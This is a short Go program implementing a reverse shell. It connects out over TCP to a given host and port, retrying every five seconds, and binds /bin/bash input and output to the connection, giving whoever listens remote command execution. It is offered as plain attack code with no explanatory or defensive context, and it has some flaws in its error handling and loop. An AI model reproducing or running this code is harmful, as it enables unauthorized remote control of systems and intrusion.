package main

import ( 
	"fmt"
	"net"
	"time"
	"os/exec"
)

func reverse_shell(host string, port string) string {
	connection, err := net.Dial("tcp", host+":"+port)
	if nil != err {
		time.Sleep(5 * time.Second)
		reverse_shell(host, port)
	}

	//Use /bin/sh
	cmd := exec.Command("/bin/bash")

	//Get user command
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
	for {
		fmt.Println(connection)
		//Launch user command and send user command output
		cmd.Run()
	}
	//Close connection
	connection.Close()
	return "Reverse shell over"
}

func main() {
	fmt.Println(reverse_shell("127.0.0.0", "42069"))
}
